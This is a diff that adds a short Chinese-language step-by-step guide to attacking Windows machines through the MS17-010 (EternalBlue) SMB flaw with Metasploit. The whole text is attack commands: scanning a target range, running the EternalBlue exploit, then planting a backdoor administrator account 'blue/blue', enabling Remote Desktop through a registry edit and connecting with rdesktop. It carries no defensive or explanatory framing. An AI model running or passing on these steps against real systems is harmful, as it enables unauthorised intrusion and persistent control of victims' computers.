@@ -1,0 +1,26 @@
+1.打开MSF框架
+msfconsole
+2.查找漏洞
+msf > search ms17-010
+3.使用模块
+msf > use auxiliary/scanner/smb/smb_ms17_010
+4.设置目标IP或网段
+msf auxiliary(smb_ms17_010) > set RHOSTS IP地址
+5.执行扫描
+msf auxiliary(smb_ms17_010) > run
+6.使用模块
+msf > use exploit/windows/smb/ms17_010_eternalblue
+7.查看可设置的选项
+msf exploit(ms17_010_eternalblue) > show options
+8.设置目标ip
+msf exploit(ms17_010_eternalblue) > set RHOST IP地址
+9.执行攻击
+msf exploit(ms17_010_eternalblue) > exploit
+10.创建用户名密码 blue/blue
+net user blue blue /add
+11.将用户blue添加入管理组
+net localgroup administrators blue /add
+12.开启远程桌面功能
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
+13.远程桌面连接（新窗口）
+rdesktop IP地址:3389
